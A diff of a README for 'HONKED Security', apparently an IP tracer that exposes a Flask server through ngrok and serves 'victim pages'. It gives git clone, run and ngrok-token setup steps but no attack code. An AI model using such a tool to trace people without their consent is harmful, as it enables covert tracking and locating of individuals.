@@ -58,23 +58,104 @@ The application utilizes **ngrok** to create secure tunnels and expose a Flask w
 
 **Important**: This application requires **Windows 10 or Windows 11 (64-bit)** to run. If your system does not meet these requirements, installation will fail.
 
-### Download Application
+### Getting HONKED Security - Two Methods
 
-**Download HONKED Security v1.5:**
-- 📥 [Download from Google Drive](https://drive.google.com/file/d/1iWAsc1SOnEM3XCyzl72Qa3aGMrejNLlJ/view?usp=drive_link)
+#### Method 1: Clone from GitHub Repository (Recommended for Development)
 
-**What's Included:**
-- Pre-compiled Windows executable (myapp.exe)
-- Inno Setup installer (mysetup.exe)
-- All dependencies configured
-- Ready to use on Windows 10/11 (64-bit)
+**Clone the official GitHub repository:**
 
-**Installation Steps After Download:**
-1. Download the file from the link above
-2. Extract/unzip if necessary
-3. Run the installer (.exe file)
-4. Follow the installation wizard
-5. Launch from Start Menu or Desktop shortcut
+1. **Open Command Prompt or PowerShell**
+2. **Run the following command:**
+   ```cmd
+   git clone https://github.com/cappiavi/HONKED-SECURITY---IP-TRACER-APP.git
+   ```
+
+3. **Navigate to the source code folder:**
+   ```cmd
+   cd HONKED-SECURITY---IP-TRACER-APP\Python End\Honked
+   ```
+
+4. **Run the application:**
+   ```cmd
+   python "HONKED SECURITY.py"
+   ```
+
+**What You Get:**
+- Full source code access
+- Ability to customize and modify the application
+- Audio support in victim pages (when music.mp3 is present)
+- Development environment
+
+#### Method 2: Install Compiled Version (For End Users)
+
+**Pre-compiled Windows installer available:**
+- Contact developer for pre-built executable version
+- Includes Inno Setup installer
+- Ready-to-use on Windows 10/11 (64-bit)
+- No source code modifications required
+
+---
+
+## Getting Started with Source Code
+
+### Step 1: Clone the Repository
+
+If you haven't already cloned the repository, do so now:
+
+```cmd
+git clone https://github.com/cappiavi/HONKED-SECURITY---IP-TRACER-APP.git
+cd HONKED-SECURITY---IP-TRACER-APP
+```
+
+Your directory structure will look like:
+```
+HONKED-SECURITY---IP-TRACER-APP/
+├── README.md                                    (This file)
+├── Python End/
+│   └── Honked/
+│       ├── HONKED SECURITY.py                 (Main application)
+│       ├── HONKED.py                          (Base version)
+│       ├── HONKED_ADVANCED.py                 (Variant)
+│       └── HONKSEC.py                         (Alternative variant)
+```
+
+### Step 2: Configure API Keys
+
+The application uses **ngrok** for tunnel creation. You must configure your own API keys:
+
+**To get your ngrok API keys:**
+
+1. Visit **https://ngrok.com** in your browser
+2. Create a free account (or login if you have one)
+3. Go to your **Dashboard** > **Auth** section
+4. Copy your **Authentication Token**
+
+**To add your API key to the application:**
+
+1. Open **HONKED SECURITY.py** in a text editor (Notepad, VS Code, etc.)
+2. Find lines 12-17 (the CLUSTER_KEYS section):
+   ```python
+   CLUSTER_KEYS = [
+       "API_KEY_1",
+       "API_KEY_2",
+       "API_KEY_3"
+   ]
+   ```
+
+3. Replace `API_KEY_1`, `API_KEY_2`, and `API_KEY_3` with your ngrok auth token:
+   - You can use the same token 3 times for simplicity
+   - Or use different tokens for failover support
+   
+   **Example:**
+   ```python
+   CLUSTER_KEYS = [
+       "YOUR_NGROK_AUTH_TOKEN_HERE",
+       "YOUR_NGROK_AUTH_TOKEN_HERE",
+       "YOUR_NGROK_AUTH_TOKEN_HERE"
+   ]
+   ```
+
+4. Save the file (Ctrl+S)
 
 ---
 
